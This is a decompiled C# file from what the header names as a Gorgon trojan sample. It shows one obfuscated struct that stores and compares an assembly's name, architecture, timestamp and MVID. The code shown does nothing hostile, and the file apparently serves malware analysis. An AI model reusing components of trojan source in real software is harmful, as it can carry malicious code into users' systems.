// Decompiled with JetBrains decompiler
// Type: wDXXQb8.4GW7en3
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using Microsoft;
using System;
using System.Reflection;

namespace wDXXQb8
{
  public struct \u0034GW7en3 : IEquatable<\u0034GW7en3>
  {
    public \u0034GW7en3(
      string fullName,
      ProcessorArchitecture processorArchitecture,
      long timestamp,
      Guid mvid)
    {
      Requires.NotNullOrEmpty(fullName, nameof (fullName));
      this.qx5iGx7 = fullName;
      this.\u0035TMnzNO = processorArchitecture;
      this.JADOrkn = timestamp;
      this.StICnaq = mvid;
    }

    public string qx5iGx7 { get; private set; }

    public long JADOrkn { get; private set; }

    public ProcessorArchitecture \u0035TMnzNO { get; private set; }

    public Guid StICnaq { get; private set; }

    public static bool operator ==(\u0034GW7en3 left, \u0034GW7en3 right) => left.wN1ayR6(right);

    public static bool operator !=(\u0034GW7en3 left, \u0034GW7en3 right) => !(left == right);

    public virtual bool ACFzJbr(object xttQ9H8) => xttQ9H8 is \u0034GW7en3 LmGENW4 && this.wN1ayR6(LmGENW4);

    public bool wN1ayR6(\u0034GW7en3 LmGENW4) => string.Equals(this.qx5iGx7, LmGENW4.qx5iGx7, StringComparison.OrdinalIgnoreCase) && this.JADOrkn == LmGENW4.JADOrkn && this.\u0035TMnzNO == LmGENW4.\u0035TMnzNO;

    public virtual int fNjygnu() => StringComparer.OrdinalIgnoreCase.GetHashCode(this.qx5iGx7);
  }
}
